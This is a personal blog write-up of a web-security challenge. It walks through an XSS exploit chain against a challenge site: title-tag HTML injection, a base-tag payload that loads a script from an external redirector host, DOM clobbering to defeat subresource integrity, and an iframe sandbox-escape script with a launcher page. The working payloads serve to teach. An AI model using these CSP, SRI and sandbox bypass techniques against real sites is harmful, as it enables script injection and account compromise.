---
title: Wacky XSS challenge with amazon (by bugpoc)
date: 2020-11-10 00:00:00 +0530
categories: [web]
tags: [web]
---

Hey, welcome to the write up for wacky XSS challenge. Throughout the write-up, i will try to not to limit myself just to the payloads or steps i specifically used but will also give you guys a front row seat to the thinking process that went behind successful completion of this challenge.

The challenge was located at [https://wacky.buggywebsite.com/](https://wacky.buggywebsite.com/) and ended on 9th november 10pm EDT.

I am gonna divide the challenge into several parts for better explanation:

lets start

<div class="tenor-gif-embed" data-postid="10551255" data-share-method="host" data-width="100%" data-aspect-ratio="1.7785714285714287"><a href="https://tenor.com/view/oh-hi-hello-hey-shake-hands-rami-malek-gif-10551255">Oh Hi Hello GIF</a> from <a href="https://tenor.com/search/ohhi-gifs">Ohhi GIFs</a></div><script type="text/javascript" async src="https://tenor.com/embed.js"></script>

**1\. The initial foothold html injection**
===========================================

You are greeted with this input field when you enter the challenge, after going around a bit i realised it has just 2 pages plus few scripts as well.

<img alt="" class="t u v jp aj" src="https%3A%2F%2Fmiro.medium.com%2Fmax%2F2400%2F1*wB1fqQOddGPBen0cM4vI4g.png" width="1098" height="885" srcSet="https://miro.medium.com/max/552/1*wB1fqQOddGPBen0cM4vI4g.png 276w, https://miro.medium.com/max/1104/1*wB1fqQOddGPBen0cM4vI4g.png 552w, https://miro.medium.com/max/1280/1*wB1fqQOddGPBen0cM4vI4g.png 640w, https://miro.medium.com/max/1400/1*wB1fqQOddGPBen0cM4vI4g.png 700w" sizes="700px" role="presentation"/>

the home page

Our text was reflected on the iframe page inside, simply viewing frame source revealed our text was getting reflected at 2 places.

1.  title tag
2.  the boring text with each letter in different font

A very simple payload would reveal that the title tag is vulnerable to html injection

```
> </title><script>alert(1)</script>
```


Our script obviously doesnt execute thanks to a defence mechanism called Content Security Policy. So lets move on to the next step.

<div class="tenor-gif-embed" data-postid="10667570" data-share-method="host" data-width="100%" data-aspect-ratio="1.7777777777777777"><a href="https://tenor.com/view/ready-lets-go-city-street-angela-moss-gif-10667570">Ready Lets Go GIF</a> from <a href="https://tenor.com/search/ready-gifs">Ready GIFs</a></div><script type="text/javascript" async src="https://tenor.com/embed.js"></script>
We are in, so let the games begin.

2\. Outsmarting the CSP
=======================

Go to network tab and look at the page headers:

> **content-security-policy:** script-src ‘nonce-ucbgymcgoplw’ ‘strict-dynamic’; frame-src ‘self’; object-src ‘none’;

few things to focus here:

1.  nonce — this makes it impossible to render any javascript until we have the randomly generated nonce value as the part of our script header. Since this changes every single time page reloads and theres no way we can predict it beforehand.
2.  frame-src —this specifies valid sources for nested browsing contexts loading using elements such as <frame> and <iframe>. [more here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src)

If we get nonce, we can esentially run any script. So, naturally first we gonna try leak it somehow. There were several resources on this but unfortunately none actually works for us. So not-defeated, just keeping this aside, i try to poke around a bit.

[_https://csp-evaluator.withgoogle.com/_](https://csp-evaluator.withgoogle.com/) _— because we love to automate stuff_

Enter your csp above here, and we get a critical a high severity finding error

> **base-uri**\[missing\]
> 
> Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to ‘none’ or ‘self’?

**so what is base-uri or base tag?**

Lets say the webpage has a html tag _<xxx src=/path>,_ in other words whenever relative paths are used instead of the whole url, the page completes this as _www.origin/path_ however if the base tag(e.g.`<base target="_blank" href="https://example.com/">`)is present. Then its resolved to https://_example.com/path_ despite whatever page its on. [read more](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base).

So lets hunt for what all things are loaded from relative path:

```
1.  script.setAttribute(‘src’, ‘files/analytics/js/frame-analytics.js’);
2.  <source src=”movie.mp4" type=”video/mp4">
```

So we have 2 cases in which we can force the page to load our file instead.

In the 2nd case since type is mp4, you can load any arbitary mp4 and cause to **_remote file inclusion_** but thats really not our motive here.

So unless we find a vuln in the video parsing library of chrome and load a malicious video we cannot really cause an XSS.

Now, onto first — here a defence called **subresource integrity** has been applied.

_Why is this a big deal?_  
Because what this does is it loads the hash value of contents of the script and compares it with a hardcoded hash, so even if we are able to inport our own script we cant really change it to anything else other than the real script introduced by the developer. [more here](https://w3c.github.io/webappsec-subresource-integrity/).

Present payload:

```
> </title><base target=”iframe” href=”https://xxxxx.redir.bugpoc.ninja/">
```

Here i am using [mock endpoint](https://bugpoc.com/testers/other/mock) as well as [flexible redirector](https://bugpoc.com/testers/other/redir) by bugpoc, since its so so much easier than hosting a file over https server and constantly making changes to it and defining headers for it.

_looks like…._

We obviously cannot let subresource integrity stand in our way.

<div class="tenor-gif-embed" data-postid="10667577" data-share-method="host" data-width="100%" data-aspect-ratio="1.7777777777777777"><a href="https://tenor.com/view/its-time-for-us-die-serious-plotting-gif-10667577">Its Time For Us GIF</a> from <a href="https://tenor.com/search/itstime-gifs">Itstime GIFs</a></div><script type="text/javascript" async src="https://tenor.com/embed.js"></script>

3\. Defeating the Subresource Integrity
=======================================

A hacker’s worst nightmare — a hash function.

Since the subresource is being hashed and compared to a hard coded value, we really have only 3 choices:

1.  Find an exception in implementaion of SRI where it skips validation.
2.  Create a different malicious script with same hash.
3.  Change the value we are comparing it to.

Since CVE-2016–1636, which was patched in Google Chrome 49.0.2623.75, There isnt any known exploit affecting the library. So the 1st choice is off the table.

We all know hash collisions exist. But only theoritically. So, I had rule out the 2nd choice as well.

So we have just 3rd choice left, which also seems impossible. _or is it?_

DOM CLOBBERING TO RESCUE!!!
---------------------------

Heres a snippet from the page source:
```
> <script nonce=xxxxxxxx>  
> window.fileIntegrity = window.fileIntegrity || {  
> ‘rfc’ : ‘ [https://w3c.github.io/webappsec-subresource-integrity/',](https://w3c.github.io/webappsec-subresource-integrity/',)  
> ‘algorithm’ : ‘sha256’,  
> ‘value’ : ‘unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=’,  
> — snip —
```
“A common pattern used by JavaScript developers is:

_var someObject = window.someObject || {};_

If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor…”

This is well explained [here](https://portswigger.net/web-security/dom-based/dom-clobbering).

But the common payloads like:
```
> <form id=”fileIntegrity”><a id=”fileIntegrity” name=”value” href=”d8Ic1uV7IeB50l……..GWd12CUZbfm8czJw=”>
```
wont cut it here, because since we are using base tag as well, it gets modified to

> sha256-www.redir.com/d8Ic1uV……….d12CUZbfm8czJw=

instead of

> sha256-d8Ic1uV7I………Wd12CUZbfm8czJw=

After a bit of reading around, i finally formulated another payload — which can be found [here](https://portswigger.net/research/dom-clobbering-strikes-back) as well.

so our payload until now is:
```
> </title><base target=”iframe” href=”https://xxxxxxxx.redir.bugpoc.ninja/"><output id=fileIntegrity>s7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=</output>
```
We have basically declared a global variable(which overrides the hardcoded one):  
_fileIntegrity.value=the\_ hash\_of\_our\_file //you can try this in console_

P.S. to obtain the hash there are several ways, however entering the payload with wrong hash displays the right one in console so its just the fastest one.

We cannot yet pop alert right now due to iframe sandboxing but go on, try having console.log(“hacked”) inside your js file ;) you deserve some serotonin.

intercepted a message from:SRI to:iframe-sandbox //chapter 4 - The last desperate attempt to stop us

<div class="tenor-gif-embed" data-postid="10668530" data-share-method="host" data-width="100%" data-aspect-ratio="1.7777777777777777"><a href="https://tenor.com/view/arrest-struggle-stop-plead-stop-the-attack-gif-10668530">Arrest Struggle GIF</a> from <a href="https://tenor.com/search/arrest-gifs">Arrest GIFs</a></div><script type="text/javascript" async src="https://tenor.com/embed.js"></script>

4\. Breaking out of the sandbox
===============================

Our challenge is to display an alert box, if you look here

> // create a sandboxed iframe  
> analyticsFrame = document.createElement(‘iframe’);  
> analyticsFrame.setAttribute(‘sandbox’, ‘**allow-scripts allow-same-origin**’);  
> analyticsFrame.setAttribute(‘class’, ‘invisible’);  
> document.body.appendChild(analyticsFrame);

Since our script is loaded inside an iframe, to be able to display an alert box we need an attribute _allow-modal_ which is not present here.

Stop googling for iframe sandbox bypass already, you wont find anything worthwhile, however if you go [here](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) and scroll down and down and down.  
You will see a warning message.

> **Notes about sandboxing:**
> 
> When the embedded document has the same origin as the embedding page, it is **strongly discouraged** to use both `allow-scripts` and `allow-same-origin`, as that lets the embedded document remove the `sandbox` attribute — making it no more secure than not using the `sandbox` attribute at all.

Our script to the original iframe with sandboxing.

<div class="tenor-gif-embed" data-postid="10667522" data-share-method="host" data-width="100%" data-aspect-ratio="1.7777777777777777"><a href="https://tenor.com/view/part-of-you-elevator-part-of-me-rami-malek-elliot-alderson-gif-10667522">Part Of You Elevator GIF</a> from <a href="https://tenor.com/search/partofyou-gifs">Partofyou GIFs</a></div><script type="text/javascript" async src="https://tenor.com/embed.js"></script>

So we have to write a script that will remove the iframe and replace it with one without restriction. You following along? This sounds easy but in-reality there was really not much information on this.

[Dusekdan](https://github.com/dusekdan/RandomSecurity/tree/master/iframeSandboxDiscouragedCombination) offers us the poc for this —sadly however it really wont work for us right off the bat so heres my code with few tune ups(i haven’t deleted some of the original code for this presentation because it gives a good visualisation):
```
> const illegalCode = () => {  
> alert(“You should not see me, because original iframe did not have ‘allow-modals’. iframe had allow-scripts and same-origin though. A new iframe without sandbox attribute was created — and here I am.”);  
> //sadly this doesnt fire anyway  
> }
> 
> const escape = () => {  
> document.body.innerText = “Loaded into a frame.”;
> 
> let parent = window.parent;  
> let container = parent.document.getElementsByTagName(“iframe”)\[0\];  
> if (parent.document.getElementsByTagName(“iframe”)\[0\] != null) {  
> // Recreate and insert an iframe without sandbox attribute that  
> // plays by our rules.  
> let replacement = parent.document.createElement(“iframe”);  
> replacement.setAttribute(“id”, “escapedAlready”);  
> //instead of using src to this script again which wont work for us thanks to  
> //frame-src self csp, a clean work around was to enter data inside script tag  
> let g = document.createElement(“script”);  
> g.innerHTML = “alert(origin)”;  
> replacement.appendChild(g);  
> parent.document.body.append(replacement);
> 
> // Remove original iframe (avoid an infinite loop)  
> container.parentNode.removeChild(container);
> 
> //code in the else statement wont work for us since we arent opening this script //again  
> } else {  
> illegalCode();  
> }  
> }
> 
> escape();
```
What we did it we from inside the iframe went to the parent document, selected the tag then in replacement created an iframe again but without sandbox attribute and inside it we added our little script.

So go [_mock endpoint_](https://bugpoc.com/testers/other/mock)  by bugpoc and save this script, then to [_flexible redirector_](https://bugpoc.com/testers/other/redir) and paste the link there and get the url to be inserted in base tag.

Dont forget to add header

> access-Control-Allow-Origin: \*

Our payload now finally:
```
> </title><base target=”iframe” href=”[https://zu2i14sjykqz.redir.bugpoc.ninja/](https://zu2i14sjykqz.redir.bugpoc.ninja/)"><output id=fileIntegrity>s7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=</output>
```
Our payload^

<div class="tenor-gif-embed" data-postid="10668173" data-share-method="host" data-width="100%" data-aspect-ratio="1.7777777777777777"><a href="https://tenor.com/view/worry-confused-fire-me-what-awkward-gif-10668173">Worry Confused GIF</a> from <a href="https://tenor.com/search/worry-gifs">Worry GIFs</a></div><script type="text/javascript" async src="https://tenor.com/embed.js"></script>

5\. Automate entering this payload
==================================

But convincing the victim to enter this in his webpage is a little too much.

If you just go to inspect element you will see the url of iframe with our payload.

Copy and paste the link in the new tab.

**It doesnt work, because the page needs to be loaded inside an iframe.**

lets look at the code again for the last time:

> // verify we are in an iframe  
> if (window.name == ‘iframe’){

so lets do just some more scripting for the [one last time](https://www.youtube.com/watch?v=BPgEgaPk62M):
```
> <html>  
> <body>
> 
> <p>Click the button to commence attack</p>
> 
> <button onclick=”myFunction()”>the button</button>
> 
> <script>
> 
> function myFunction() {  
> myWindow = window.open(“[https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20target=%22iframe%22%20href=%22https://zu2i14sjykqz.redir.bugpoc.ninja/%22%3E%3Coutput%20id=fileIntegrity%3Es7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=%3C/output%3E](https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20target=%22iframe%22%20href=%22https://zu2i14sjykqz.redir.bugpoc.ninja/%22%3E%3Coutput%20id=fileIntegrity%3Es7ukMoQThWrleJgNJPZfhm0YhrdECzffE0ZjASRRO0U=%3C/output%3E)", “iframe”, “width=2000,height=1000”);  
> }
> 
> </script>
```
Opening a window and naming it as iframe does the trick and we get our beautiful alert box displaying origin and then one by amazon thanking us for our participation.

<div class="tenor-gif-embed" data-postid="10668183" data-share-method="host" data-width="100%" data-aspect-ratio="1.7777777777777777"><a href="https://tenor.com/view/panic-alarm-run-fear-vandal-gif-10668183">Panic Alarm GIF</a> from <a href="https://tenor.com/search/panic-gifs">Panic GIFs</a></div><script type="text/javascript" async src="https://tenor.com/embed.js"></script>

pwnd

Stay safe
=========

All the attack above are caused when developer trusts out of the box defence solutions too much.

> A fortress is only as strong as its weakest point.

The underlying principle is to strengthen each phase of defence mechanism, and to enforce a zero-trust-policy. The user input should always be considered malicious. **Thankyou for reading! and until next time.**
